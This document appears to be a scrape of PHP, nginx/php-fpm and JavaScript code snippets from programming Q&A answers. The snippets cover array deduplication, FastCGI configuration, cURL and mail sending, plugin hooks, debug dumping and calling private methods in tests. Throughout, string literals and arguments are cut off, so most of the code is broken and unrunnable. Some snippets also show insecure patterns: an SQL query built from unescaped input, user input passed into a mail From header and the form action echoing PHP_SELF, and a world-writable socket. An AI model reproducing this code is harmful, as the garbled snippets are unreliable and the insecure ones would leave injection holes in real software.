$data1 = array(); $data1 = $data; for($q=0;$q<count($data);$q++) { for($p=0;$p<count($data1);$p++) { if (($data[$q]["subject"] == $data1[$p]["object"]) && ($data[$q]["object"] == $data1[$p]["subject"])) { $data1[$p]["subject"] = $data[$q]["subject"]; $data1[$p]["object"] = $data[$q]["object"]; } } } $data1 = array_values(array_map("unserialize", array_unique(array_map("serialize", $data1)))); $data = $data1;
$count_array = count($input); for ($i = 0; $i < $count_array; $i++) { if (isset($input[$i])) { for ($j = $i+1; $j < $count_array; $j++) { if (isset($input[$j])) { if ($input[$i][ unset($input[$j]); } } } } }
$serialized_array = array_map("serialize", $input); foreach ($serialized_array as $key => $val) { $result[$val] = true; } $output = array_map("unserialize", (array_keys($result)));
user www www; worker_processes 1; location / { root /usr/home/user/public_html; index index.php index.html index.htm; } location ~ [^/]\.php(/|$) { fastcgi_split_path_info ^(.+?\.php)(/.*)$; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /usr/home/user/public_html$fastcgi_script_name; include fastcgi_params; }
listen.owner = www-data listen.group = www-data listen.mode = 0660
; Set permissions for unix socket, if one is used. In Linux, read/write ; permissions must be set in order to allow connections from a web server. Many ; BSD-derived systems allow connections regardless of permissions. ; Default Values: user and group are set as the running user ; mode is set to 0660 ;listen.owner = www-data ;listen.group = www-data ;listen.mode = 0660
listen.owner = www-data listen.group = www-data listen.mode = 0660
listen.owner = www-data listen.group = www-data listen.mode = 0660
fastcgi_param QUERY_STRING $query_string; fastcgi_param REQUEST_METHOD $request_method; fastcgi_param CONTENT_TYPE $content_type; fastcgi_param CONTENT_LENGTH $content_length; fastcgi_param SCRIPT_NAME $fastcgi_script_name; fastcgi_param REQUEST_URI $request_uri; fastcgi_param DOCUMENT_URI $document_uri; fastcgi_param DOCUMENT_ROOT $document_root; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param SERVER_PROTOCOL $server_protocol; fastcgi_param PATH_INFO $fastcgi_script_name; fastcgi_param HTTPS $https if_not_empty; fastcgi_param GATEWAY_INTERFACE CGI/1.1; fastcgi_param SERVER_SOFTWARE nginx/$nginx_version; fastcgi_param REMOTE_ADDR $remote_addr; fastcgi_param REMOTE_PORT $remote_port; fastcgi_param SERVER_ADDR $server_addr; fastcgi_param SERVER_PORT $server_port; fastcgi_param SERVER_NAME $server_name; fastcgi_param REDIRECT_STATUS 200;
fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param PATH_INFO $fastcgi_script_name;
listen.owner = nginx listen.group = nginx listen.mode = 0660
user www-data www; user www-data www-data; user www www-data;
dmesg | grep php [...] [ 4996.801789] traps: php5-fpm[23231] general protection ip:6c60d1 sp:7fff3f8c68f0 error:0 in php5-fpm[400000+800000] [ 6788.335355] traps: php5-fpm[9069] general protection ip:6c5d81 sp:7fff98dd9a00 error:0 in php5-fpm[400000+7ff000]
location ~ \.php$ { fastcgi_pass unix:/var/run/php5-fpm.sock; include /etc/nginx/snippets/fastcgi-php.conf; }
$ diff -up fastcgi_params fastcgi.conf --- fastcgi_params 2015-07-22 01:42:39.000000000 +0200 +++ fastcgi.conf 2015-07-22 01:42:39.000000000 +0200 @@ -1,4 +1,5 @@ +fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param QUERY_STRING $query_string; fastcgi_param REQUEST_METHOD $request_method; fastcgi_param CONTENT_TYPE $content_type;
fastcgi_split_path_info ^(.+\.php)(/.+)$; try_files $fastcgi_script_name =404; set $path_info $fastcgi_path_info; fastcgi_param PATH_INFO $path_info; fastcgi_index index.php; include fastcgi.conf;
listen.owner = nginx listen.group = nginx chown nginx:nginx /var/run/php-fpm/php-fpm.sock
listen.owner = nginx listen.group = nginx listen.mode = 0666
add-apt-repository ppa:ondrej/php apt-get purge php5-common apt-get update apt-get install php5.6
user = [pool-user] group = [pool-group] listen.owner = [nginx-user] listen.group = [nginx-group]
function CallAPI($method, $url, $data = false) { $curl = curl_init(); switch ($method) { case "POST": curl_setopt($curl, CURLOPT_POST, 1); if ($data) curl_setopt($curl, CURLOPT_POSTFIELDS, $data); break; case "PUT": curl_setopt($curl, CURLOPT_PUT, 1); break; default: if ($data) $url = sprintf("%s?%s", $url, http_build_query($data)); } curl_setopt($curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC); curl_setopt($curl, CURLOPT_USERPWD, "username:password"); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); $result = curl_exec($curl); curl_close($curl); return $result; }
$client = new GuzzleHttp\Client(); $res = $client->get( ]); echo $res->getStatusCode(); echo $res->getHeader( echo $res->getBody(); var_export($res->json());
$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "THE URL TO THE SERVICE"); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, POST DATA); $result = curl_exec($ch); print_r($result); curl_close($ch);
$uri = "https: $response = \Httpful\Request::get($uri)->send(); echo
$processed = FALSE; $ERROR_MESSAGE = $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "http: curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS,"username=myname&password=mypass"); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($ch); curl_close ($ch); $obj = json_decode($json); if ($obj->{ { $processed = TRUE; }else{ $ERROR_MESSAGE = $obj->{ } ... if (!$processed && $ERROR_MESSAGE != echo $ERROR_MESSAGE; }
try { $restClient = new RestClient(); $response = $restClient->get( $statusCode = $response->getStatusCode(); $content = $response->getContent(); } catch(OperationTimedOutException $e) { }
/* * @Entity * @DataSource\Select("http: * @DataSource\Insert("http: * @DataSource\Select("http: * @DataSource\Fetch("http: * @DataSource\Delete("http: */ class Product { private $name; public function setName($name) { $this->name = $name; } public function getName() { return $this->name; } }
$product = new Product(); $product->setName( $em->persist($product); $em->flush(); $product->setName( $em->flush();
class CurlHelper { public static function perform_http_request($method, $url, $data = false) { $curl = curl_init(); switch ($method) { case "POST": curl_setopt($curl, CURLOPT_POST, 1); if ($data) curl_setopt($curl, CURLOPT_POSTFIELDS, $data); break; case "PUT": curl_setopt($curl, CURLOPT_PUT, 1); break; default: if ($data) $url = sprintf("%s?%s", $url, http_build_query($data)); } curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); $result = curl_exec($curl); curl_close($curl); return $result; } }
require_once("curl_helper.php"); ... $action = "GET"; $url = "api.server.com/model" echo "Trying to reach ..."; echo $url; $parameters = array("param" => "value"); $result = CurlHelper::perform_http_request($action, $url, $parameters); echo print_r($result)
<?php $to = $subject = $message = $headers = mail($to, $subject, $message, $headers); ?>
<?php require $mail = new PHPMailer; $mail->isSMTP(); $mail->Host = $mail->SMTPAuth = true; $mail->Username = $mail->Password = $mail->SMTPSecure = $mail->From = $mail->FromName = $mail->addAddress( $mail->addAddress( $mail->addReplyTo( $mail->addCC( $mail->addBCC( $mail->WordWrap = 50; $mail->addAttachment( $mail->addAttachment( $mail->isHTML(true); $mail->Subject = $mail->Body = $mail->AltBody = if(!$mail->send()) { echo echo } else { echo }
$to = $to .= $subject = $message = ' <html> <head> <title>Birthday Reminders for August</title> </head> <body> <p>Here are the birthdays upcoming in August!</p> <table> <tr> <th>Person</th><th>Day</th><th>Month</th><th>Year</th> </tr> <tr> <td>Joe</td><td>3rd</td><td>August</td><td>1970</td> </tr> <tr> <td>Sally</td><td>17th</td><td>August</td><td>1973</td> </tr> </table> </body> </html> $headers = $headers .= $headers .= $headers .= $headers .= $headers .= mail($to, $subject, $message, $headers);
<?php include( $recipients = $headers[ $headers[ $headers[ $body = $smtpinfo["host"] = "smtp.server.com"; $smtpinfo["port"] = "25"; $smtpinfo["auth"] = true; $smtpinfo["username"] = "smtp_user"; $smtpinfo["password"] = "smtp_password"; $mail_object =& Mail::factory("smtp", $smtpinfo); $mail_object->send($recipients, $headers, $body); ?>
require $message = Swift_Message::newInstance() ->setSubject( ->setFrom(array( ->setTo(array( ->setBody( if (Swift_Mailer::newInstance(Swift_MailTransport::newInstance())->send($message)) { echo json_encode([ "status" => "OK", "message" => ], JSON_PRETTY_PRINT); } else { echo json_encode([ "status" => "error", "message" => ], JSON_PRETTY_PRINT); }
<?php $to = $subject = $message = $from = "From: FirstName LastName <SomeEmailAddress@Domain.com>"; mail($to,$subject,$message,$from);
<?php $to = "somebody@example.com"; $subject = "My subject"; $txt = "Hello world!"; $headers = "From: webmaster@example.com" . "\r\n" . "CC: somebodyelse@example.com"; mail($to,$subject,$txt,$headers); ?>
<?php $to = $subject = $message = ' <html> <head> <title>Birthday Reminders for August</title> </head> <body> <p>Here are the birthdays upcoming in August!</p> <table> <tr> <th>Person</th><th>Day</th><th>Month</th><th>Year</th> </tr> <tr> <td>Johny</td><td>10th</td><td>August</td><td>1970</td> </tr> <tr> <td>Sally</td><td>17th</td><td>August</td><td>1973</td> </tr> </table> </body> </html> $headers[] = $headers[] = $headers[] = $headers[] = $headers[] = $headers[] = mail($to, $subject, $message, implode("\r\n", $headers)); ?>
require_once( require_once( ... // function sendmail($to,$nameto,$subject,$message,$altmess) { $from = "yourcontact@yourdomain.com" $namefrom = "yourname"; $mail = new PHPMailer(); $mail->CharSet = $mail->isSMTP(); $mail->SMTPAuth = true; $mail->Host = "localhost"; $mail->Port = 25; $mail->Username = $from; $mail->Password = "yourpassword"; $mail->SMTPSecure = ""; $mail->setFrom($from,$namefrom); $mail->addCC($from,$namefrom); $mail->Subject = $subject; $mail->AltBody = $altmess; $mail->Body = $message; $mail->isHTML(); $mail->addAddress($to, $nameto); return $mail->send(); }
<h2>Test Mail</h2> <?php if (!isset($_POST["submit"])) { ?> <form method="post" action="<?php echo $_SERVER["PHP_SELF"];?>"> From: <input type="text" name="from"><br> Subject: <input type="text" name="subject"><br> Message: <textarea rows="10" cols="40" name="message"></textarea><br> <input type="submit" name="submit" value="Click To send mail"> </form> <?php } else { if (isset($_POST["from"])) { $from = $_POST["from"]; $subject = $_POST["subject"]; $message = $_POST["message"]; $message = wordwrap($message, 70); mail("Test@example.com",$subject,$message,"From: $from\n"); echo "Thank you for sending an email"; } } ?>
<?php include "db_conn.php"; require "PHPMailerAutoload.php"; require "class.smtp.php"; require "class.phpmailer.php"; $response = array(); $params = json_decode(file_get_contents("php: if(!empty($params->email_id)){ $email_id = $params->email_id; $flag=false; echo "something"; if(!filter_var($email_id, FILTER_VALIDATE_EMAIL)) { $response[ echo json_encode($response,JSON_UNESCAPED_SLASHES); return; } $sql="SELECT * from sales where email_id = $result = mysqli_query($conn,$sql); $count = mysqli_num_rows($result); $to = "demo@gmail.com"; $subject = "DEMO Subject"; $messageBody ="demo message ."; if($count ==0){ $response["valid"] = false; $response["message"] = "User is not registered yet"; echo json_encode($response); return; } else { $mail = new PHPMailer(); $mail->IsSMTP(); $mail->SMTPAuth = true; $mail->IsHTML(true); $mail->SMTPSecure = $mail->Host = "p3plcpnl0749.prod.phx3.secureserver.net"; $mail->Port = 465; $mail->Username = "demousername@example.com"; $mail->Password = "demopassword"; $mail->SetFrom("demousername@example.com", "Any demo alert"); $mail->Subject = $subject; $mail->Body = $messageBody; $mail->AddAddress($to); echo "yes"; if(!$mail->send()) { echo "Mailer Error: " . $mail->ErrorInfo; } else { echo "Message has been sent successfully"; } } } else{ $response["valid"] = false; $response["message"] = "Required field(s) missing"; echo json_encode($response); } ?>
$object = new stdClass(); $object->property = var_dump($object); /* outputs: object(stdClass) ["property"]=> string(10) "Here we go" } */
<?php /** Plugin system **/ $listeners = array(); function hook() { global $listeners; $num_args = func_num_args(); $args = func_get_args(); if($num_args < 2) trigger_error("Insufficient arguments", E_USER_ERROR); $hook_name = array_shift($args); if(!isset($listeners[$hook_name])) return; foreach($listeners[$hook_name] as $func) { $args = $func($args); } return $args; } function add_listener($hook, $function_name) { global $listeners; $listeners[$hook][] = $function_name; } /** Sample Plugin **/ add_listener( add_listener( function my_plugin_func1($args) { return array(4, 5); } function my_plugin_func2($args) { return str_replace( } /** Sample Application **/ $a = 1; $b = 2; list($a, $b) = hook( $str = "This is my sample application\n"; $str .= "$a + $b = ".($a+$b)."\n"; $str .= "$a * $b = ".($a*$b)."\n"; $str = hook( echo $str; ?>
<?php class Plugin { private $_RefObject; private $_Class = public function __construct(&$RefObject) { $this->_Class = get_class(&$RefObject); $this->_RefObject = $RefObject; } public function __set($sProperty,$mixed) { $sPlugin = $this->_Class . if (is_callable($sPlugin)) { $mixed = call_user_func_array($sPlugin, $mixed); } $this->_RefObject->$sProperty = $mixed; } public function __get($sProperty) { $asItems = (array) $this->_RefObject; $mixed = $asItems[$sProperty]; $sPlugin = $this->_Class . if (is_callable($sPlugin)) { $mixed = call_user_func_array($sPlugin, $mixed); } return $mixed; } public function __call($sMethod,$mixed) { $sPlugin = $this->_Class . if (is_callable($sPlugin)) { $mixed = call_user_func_array($sPlugin, $mixed); } if ($mixed != call_user_func_array(array(&$this->_RefObject, $sMethod), $mixed); $sPlugin = $this->_Class . if (is_callable($sPlugin)) { call_user_func_array($sPlugin, $mixed); } } } } class Pluggable extends Plugin { } class Dog { public $Name = public function bark(&$sHow) { echo "$sHow<br />\n"; } public function sayName() { echo "<br />\nMy Name is: " . $this->Name . "<br />\n"; } } $Dog = new Dog(); $PDog = new Pluggable($Dog); function Dog_bark_beforeEvent(&$mixed) { $mixed = return $mixed; } function Dog_bark_afterEvent(&$mixed) { echo $mixed; } function Dog_Name_setEvent(&$mixed) { $mixed = return $mixed; } function Dog_Name_getEvent(&$mixed) { $mixed = return $mixed; } $PDog->Name = $PDog->Bark( $PDog->SayName(); echo
<?php class SignalsHandler { /** * hash of senders/signals to slots * * @var array */ private static $connections = array(); /** * current sender * * @var class|object */ private static $sender; /** * connects an object/signal with a slot * * @param class|object $sender * @param string $signal * @param callable $slot */ public static function connect($sender, $signal, $slot) { if (is_object($sender)) { self::$connections[spl_object_hash($sender)][$signal][] = $slot; } else { self::$connections[md5($sender)][$signal][] = $slot; } } /** * sends a signal, so all connected slots are called * * @param class|object $sender * @param string $signal * @param array $params */ public static function signal($sender, $signal, $params = array()) { self::$sender = $sender; if (is_object($sender)) { if ( ! isset(self::$connections[spl_object_hash($sender)][$signal])) { return; } foreach (self::$connections[spl_object_hash($sender)][$signal] as $slot) { call_user_func_array($slot, (array)$params); } } else { if ( ! isset(self::$connections[md5($sender)][$signal])) { return; } foreach (self::$connections[md5($sender)][$signal] as $slot) { call_user_func_array($slot, (array)$params); } } self::$sender = null; } /** * returns a current signal sender * * @return class|object */ public static function sender() { return self::$sender; } } class User { public function login() { /** * try to login */ if ( ! $logged ) { SignalsHandler::signal(this, } } } class App { public static function onFailedLogin($message) { print $message; } } $user = new User(); SignalsHandler::connect($user, SignalsHandler::connect($user, $user->login(); ?>
{% if var is defined %} {% endif %} {% if var is not null %} {% endif %}
{% if var is defined %} var is variable is SET {% endif %}
{{ yourVariable is not defined ? "Not Assigned" : "Assigned" }}
$array = array( "foo" => "bar", "bar" => "foo", ); $array = [ "foo" => "bar", "bar" => "foo", ];
$myArray[] = "tree"; $myArray[] = "house"; $myArray[] = "dog";
$myArray[0] = "tree"; $myArray[1] = "house"; $myArray[2] = "dog";
$myArray[10] = "tree"; $myArray[20] = "house"; $myArray[] = "dog";
<?php $array2=array(6,"santosh","rahul",array("x","y","z")); ?>
$img = file_get_contents( $file = dirname(__file__). file_put_contents($file, $img);
{ "data": { "url": "https: "width": 148, "height": 117, "is_silhouette": false } }
$url = "http: $headers = get_headers($url, 1); if( isset($headers[ echo $headers[ else echo "ERROR";
require $photo="https: $sample = new sfFacebookPhoto; $thephotoURL = $sample->getRealUrl($photo); echo $thephotoURL;
<?php /** * Facebook user photo downloader */ class sfFacebookPhoto { private $useragent = private $curl = null; private $response_meta_info = array(); private $header = array( "Accept-Encoding: gzip,deflate", "Accept-Charset: utf-8;q=0.7,*;q=0.7", "Connection: close" ); public function __construct() { $this->curl = curl_init(); register_shutdown_function(array($this, } /** * Get the real URL for the picture to use after */ public function getRealUrl($photoLink) { curl_setopt($this->curl, CURLOPT_HTTPHEADER, $this->header); curl_setopt($this->curl, CURLOPT_RETURNTRANSFER, false); curl_setopt($this->curl, CURLOPT_HEADER, false); curl_setopt($this->curl, CURLOPT_USERAGENT, $this->useragent); curl_setopt($this->curl, CURLOPT_CONNECTTIMEOUT, 10); curl_setopt($this->curl, CURLOPT_TIMEOUT, 15); curl_setopt($this->curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1); curl_setopt($this->curl, CURLOPT_URL, $photoLink); curl_setopt($this->curl, CURLOPT_HEADERFUNCTION, array(&$this, $response = curl_exec($this->curl); if (!curl_errno($this->curl)) { $info = curl_getinfo($this->curl); var_dump($info); if ($info["http_code"] == 302) { $headers = $this->getHeaders(); if (isset($headers[ return $headers[ } } } return false; } /** * Download Facebook user photo * */ public function download($fileName) { curl_setopt($this->curl, CURLOPT_HTTPHEADER, $this->header); curl_setopt($this->curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($this->curl, CURLOPT_HEADER, false); curl_setopt($this->curl, CURLOPT_USERAGENT, $this->useragent); curl_setopt($this->curl, CURLOPT_CONNECTTIMEOUT, 10); curl_setopt($this->curl, CURLOPT_TIMEOUT, 15); curl_setopt($this->curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1); curl_setopt($this->curl, CURLOPT_URL, $fileName); $response = curl_exec($this->curl); $return = false; if (!curl_errno($this->curl)) { $parts = explode( $ext = array_pop($parts); $return = sfConfig::get( file_put_contents($return, $response); } return $return; } /** * cURL callback function for reading and processing headers. * Override this for your needs. * * @param object $ch * @param string $header * @return integer */ private function readHeader($ch, $header) { $filename = $this->extractCustomHeader( if ($filename) { $this->response_meta_info[ } return strlen($header); } private function extractCustomHeader($start, $end, $header) { $pattern = if (preg_match($pattern, $header, $result)) { return $result[1]; } else { return false; } } public function getHeaders() { return $this->response_meta_info; } /** * Cleanup resources */ public function shutdown() { if($this->curl) { curl_close($this->curl); } } }
function get_facebook_user_avatar($fbId){ $json = file_get_contents( $picture = json_decode($json, true); return $picture[ }
function get_raw_facebook_avatar_url($uid) { $array = get_headers( return (isset($array[ }
$values = get_values(); foreach ($values as $value){ ... }
if (is_array($values) || is_object($values)) { foreach ($values as $value) { ... } }
/** * Determine if a variable is iterable. i.e. can be used to loop over. * * @return bool */ function is_iterable($var) { return $var !== null && (is_array($var) || $var instanceof Traversable || $var instanceof Iterator || $var instanceof IteratorAggregate ); } $values = get_values(); if (is_iterable($values)) { foreach ($values as $value) { } }
$dataArr = is_array($dataArr) ? $dataArr : array($dataArr); foreach ($dataArr as $val) { echo $val; }
$values = get_values(); foreach ((array) $values as $value){ ... }
function secure_iterable($var) { return is_iterable($var) ? $var : array(); } foreach (secure_iterable($values) as $value) { }
<?php foreach (secure_iterable($values) as $value): ?> ... <?php endforeach; ?>
$array = [1,2,3,4]; foreach ( $array ?? [] as $item ) { echo $item; }
if (is_array($values)) { foreach ($values as $value) { $values = null; } }
$type = gettype($your_iteratable); $types = array( ); if (in_array($type, $types)) { }
$array = [ if(!empty($array) && isset($array) && is_array($array){ foreach ($array as $values) { echo $values; } }
if (is_array($your_variable)) { foreach ($your_variable as $item) { } }
if (is_array($tweets)){ foreach ( $tweets as $tweet ) { ... } }
if(empty($yourArray)) {echo"<p>There else { foreach ($yourArray as $current_array_item) { } }
function dump(obj) { var out = for (var i in obj) { out += i + ": " + obj[i] + "\n"; } alert(out); var pre = document.createElement( pre.innerHTML = out; document.body.appendChild(pre) }
/** * Does a PHP var_dump * first parameter is the variable, and the second parameter is an optional * name. This can be the variable name [makes it easier to distinguish between * numerious calls to this function], but any string value can be passed. * * @param mixed var_value - the variable to be dumped * @param string var_name - ideally the name of the variable, which will be used * to label the dump. If this argumment is omitted, then the dump will * display without a label. * @param boolean - annonymous third parameter. * On TRUE publishes the result to the DOM document body. * On FALSE a string is returned. * Default is TRUE. * @returns string|inserts Dom Object in the BODY element. */ function my_dump (var_value, var_name) { var is_publish_to_body = typeof arguments[2] === var indent_by = typeof arguments[3] === var do_boolean = function (v) { return }; var do_number = function(v) { var num_digits = ( return }; var do_string = function(v) { var num_chars = v.length; return }; var do_object = function(v) { if (v === null) { return "NULL(0)"; } var out = var num_elem = 0; var indent = if (v instanceof Array) { num_elem = v.length; for (var d=0; d<indent_by; ++d) { indent += } out = "Array("+num_elem+") \n"+(indent.length === 0? for (var i=0; i<num_elem; ++i) { out += "\n"+(indent.length === 0? } out += "\n"+(indent.length === 0? return out; } else if (v instanceof Object) { for (var d=0; d<indent_by; ++d) { indent += } out = "Object \n"+(indent.length === 0? for (var p in v) { out += "\n"+(indent.length === 0? } out += "\n"+(indent.length === 0? return out; } else { return } }; var_name = typeof var_name === var out = var v_name = switch (typeof var_value) { case "boolean": v_name = var_name.length > 0 ? var_name + out += v_name + do_boolean(var_value); break; case "number": v_name = var_name.length > 0 ? var_name + out += v_name + do_number(var_value); break; case "string": v_name = var_name.length > 0 ? var_name + out += v_name + do_string(var_value); break; case "object": v_name = var_name.length > 0 ? var_name + out += v_name + do_object(var_value); break; case "function": v_name = var_name.length > 0 ? var_name + out += v_name + "Function"; break; case "undefined": v_name = var_name.length > 0 ? var_name + out += v_name + "Undefined"; break; default: out += v_name + } if (is_publish_to_body && indent_by === 0) { var div_dump = document.getElementById( if (!div_dump) { div_dump = document.createElement( div_dump.id = var style_dump = document.getElementsByTagName("style")[0]; if (!style_dump) { var head = document.getElementsByTagName("head")[0]; style_dump = document.createElement("style"); head.appendChild(style_dump); } var addRule; if (typeof document.styleSheets != "undefined" && document.styleSheets) { addRule = function(selector, rule) { var styleSheets = document.styleSheets, styleSheet; if (styleSheets && styleSheets.length) { styleSheet = styleSheets[styleSheets.length - 1]; if (styleSheet.addRule) { styleSheet.addRule(selector, rule) } else if (typeof styleSheet.cssText == "string") { styleSheet.cssText = selector + " {" + rule + "}"; } else if (styleSheet.insertRule && styleSheet.cssRules) { styleSheet.insertRule(selector + " {" + rule + "}", styleSheet.cssRules.length); } } }; } else { addRule = function(selector, rule, el, doc) { el.appendChild(doc.createTextNode(selector + " {" + rule + "}")); }; } addRule( addRule( addRule( style_dump = null; } var pre_dump = document.getElementById( if (!pre_dump) { pre_dump = document.createElement( pre_dump.id = pre_dump.innerHTML = out+"\n"; div_dump.appendChild(pre_dump); document.body.appendChild(div_dump); } else { pre_dump.innerHTML += out+"\n"; } } else { return out; } }
var objectInStringFormat = JSON.stringify(someObject); alert(objectInStringFormat);
function dump(v) { switch (typeof v) { case "object": for (var i in v) { console.log(i+":"+v[i]); } break; default: console.log(typeof v+":"+v); break; } }
function var_dump(obj, element) { var logMsg = objToString(obj, 0); if (element) { var pre = document.createElement( pre.innerHTML = logMsg; element.innerHTML = element.appendChild(pre); } else { console.log(logMsg); } } function objToString(obj, level) { var out = for (var i in obj) { for (loop = level; loop > 0; loop--) { out += " "; } if (obj[i] instanceof Object) { out += i + " (Object):\n"; out += objToString(obj[i], level + 1); } else { out += i + ": " + obj[i] + "\n"; } } return out; }
console.log(OBJECT|ARRAY|STRING|...); console.info(OBJECT|ARRAY|STRING|...); console.debug(OBJECT|ARRAY|STRING|...); console.warn(OBJECT|ARRAY|STRING|...); console.assert(Condition,
function dump(obj) { var out = for (var i in obj) { if(typeof obj[i] === dump(obj[i]); }else{ out += i + ": " + obj[i] + "\n"; } } var pre = document.createElement( pre.innerHTML = out; document.body.appendChild(pre); }
function dump(v, s) { s = s || 1; var t = switch (typeof v) { case "object": t += "\n"; for (var i in v) { t += Array(s).join(" ")+i+": "; t += dump(v[i], s+3); } break; default: t += v+" ("+typeof v+")\n"; break; } return t; }
var a = { b: 1, c: { d:1, e:2, d:3, c: { d:1, e:2, d:3 } } }; var d = dump(a); console.log(d); document.getElementById("
b: 1 (number) c: d: 3 (number) e: 2 (number) c: d: 3 (number) e: 2 (number)
function dump(arr,level) { var dumped_text = ""; if(!level) level = 0; var level_padding = ""; for(var j=0;j<level+1;j++) level_padding += " "; if(typeof(arr) == for(var item in arr) { var value = arr[item]; if(typeof(value) == dumped_text += level_padding + " dumped_text += dump(value,level+1); } else { dumped_text += level_padding + " } } } else { dumped_text = "===>"+arr+"<===("+typeof(arr)+")"; } return dumped_text; }
/* * Brief: Print to console.log() from PHP * Description: Print as many strings,arrays, objects, and other data types to console.log from PHP. * To use, just call consoleLog($data1, $data2, ... $dataN) and each dataI will be sent to console.log - note that * you can pass as many data as you want an this will still work. * * This is very powerful as it shows the entire contents of objects and arrays that can be read inside of the browser console log. * * A tag can be set by passing a string that has the prefix TAG- as one of the arguments. Everytime a string with the TAG- prefix is * detected, the tag is updated. This allows you to pass a tag that is applied to all data until it reaches another tag, which can then * be applied to all data after it. * * Example: * consoleLog( * Result: * FirstTag * FirstTag * SecTag */ function consoleLog(){ if(func_num_args() == 0){ return; } $tag = for ($i = 0; $i < func_num_args(); $i++) { $arg = func_get_arg($i); if(!empty($arg)){ if(is_string($arg)&& strtolower(substr($arg,0,4)) === $tag = substr($arg,4); }else{ $arg = json_encode($arg, JSON_HEX_TAG | JSON_HEX_AMP ); echo "<script>console.log( } } } }
${"variableName"} = 12; $className->{"variableName"}; $className->{"methodName"}(); StaticClass::${"variableName"}; StaticClass::{"methodName"}();
function foo($msg) { echo $msg."<br />"; } $var1 = "foo"; $var1("testing 1,2,3");
$function_name = $function_name(arg1, arg2); call_user_func_array($function_name, array(arg1, arg2));
$object->$function_name(arg1, arg2); call_user_func_array(array($object, $function_name), array(arg1, arg2));
if(method_exists($object, $function_name)) { $object->$function_name(arg1, arg2); }
$lightdark="lighten"; $color="fcc"; $percent=0.15; include_once("csscolor.php"); $c = & new CSS_Color($color); $rtn=call_user_func( array(&$c,$lightdark),$color,$percent);
$params=Array($color,$percent); $rtn=call_user_func( array(&$c,$lightdark),$params);
$x = (new ReflectionFunction("foo"))->getClosure(); $x();
namespace greetings; function hello() { } $myvar = "hello"; $myvar();
function get_method($object, $method){ return function() use($object, $method){ $args = func_get_args(); return call_user_func_array(array($object, $method), $args); }; } class test{ function echo_this($text){ echo $text; } } $test = new test(); $echo = get_method($test, $echo(
function something() { echo 256; } $foo = "something"; $foo();
$bar = "some_thing"; (str_replace("_", "", $bar))();
(expressions)[ (expressions)->bar (expressions)->bar() (expressions)->$bar() (expressions)::$bar (expressions)::bar() (expressions)()
echo (new class { public $something = 512; })->something;
class X { public function object_call() { echo "Object Call"; } public static function static_call() { echo "Static Call"; } } [new X(), "object_call"](); [new X(), "static_call"]();
$current_page = $function = @${$current_page . $function = function() { echo }; $function();
if($functionName == foo(); } else if($functionName == bar(); }
protected static function getMethod($name) { $class = new ReflectionClass( $method = $class->getMethod($name); $method->setAccessible(true); return $method; } public function testFoo() { $foo = self::getMethod( $obj = new MyClass(); $foo->invokeArgs($obj, array(...)); ... }
class Foo { protected function stuff() { } } class SubFoo extends Foo { public function exposedStuff() { return $this->stuff(); } }
class PHPUnitUtil { public static function callMethod($obj, $name, array $args) { $class = new \ReflectionClass($obj); $method = $class->getMethod($name); $method->setAccessible(true); return $method->invokeArgs($obj, $args); } }
$returnVal = PHPUnitUtil::callMethod( $this->object, array($arg1, $arg2) );
class PHPUnitUtil { /** * Get a private or protected method for testing/documentation purposes. * How to use for MyClass->foo(): * $cls = new MyClass(); * $foo = PHPUnitUtil::getPrivateMethod($cls, * $foo->invoke($cls, $...); * @param object $obj The instantiated instance of your class * @param string $name The name of your private/protected method * @return ReflectionMethod The method you asked for */ public static function getPrivateMethod($obj, $name) { $class = new ReflectionClass($obj); $method = $class->getMethod($name); $method->setAccessible(true); return $method; } }
class ClassToTest { protected testThisMethod() { } }
class TestClassToTest extends ClassToTest { public testThisMethod() { return parent::testThisMethod(); } }
class Example { protected function getMessage() { return } }
class ExampleExposed extends Example { public function __call($method, array $args = array()) { if (!method_exists($this, $method)) throw new BadMethodCallException("method return call_user_func_array(array($this, $method), $args); } }
class ExampleTest extends PHPUnit_Framework_TestCase { function testGetMessage() { $fixture = new ExampleExposed(); self::assertEquals( } }
function debug_to_console( $data ) { $output = $data; if ( is_array( $output ) ) $output = implode( echo "<script>console.log( }
<script> console.log(<?= json_encode($foo); ?>); </script>
/** * Simple helper to debug to the console * * @param $data object, array, string $data * @param $context string Optional a description. * * @return string */ function debug_to_console( $data, $context = ob_start(); $output = $output .= $output = sprintf( echo $output; }
echo "<div display= <script type= console.log( </script> </div>";
function console($data, $priority, $debug) { if ($priority <= $debug) { if (is_array($data)) $output = else $output = echo $output; } }
<?php $debug = 5; console( console( console( console( ?>
Important Less Important Even Less Important Again Important
function jsLogs($data) { $html = ""; $coll; if (is_array($data) || is_object($data)) { $coll = json_encode($data); } else { $coll = $data; } $html = "<script>console.log( echo($html); } jsLogs(array("test1", "test2")); jsLogs(array("test1"=>array("subtest1", "subtest2"))); jsLogs("testing string");
function phpconsole($label= ?> <script type="text/javascript"> console.log( console.log( </script> <?php }
function console_log( $data ) { $output = "<script>console.log( $output .= json_encode(print_r($data, true)); $output .= " echo $output; }
include ChromePhp::log( ChromePhp::log($_SERVER); ChromePhp::warn(
Show globals vars ($GLOBALS, $_POST, $_GET, $_COOKIE ...) Show php version and loaded extensions Replace php built in error handler Log sql queries Monitor code and sql queries execution time Inspect variables for changes Function calls tracing Code coverage analysis to check which lines of script where executed Dump of all types of variable File inspector with code highlighter to view source code Send messages to js console(Chrome only), for ajax scripts
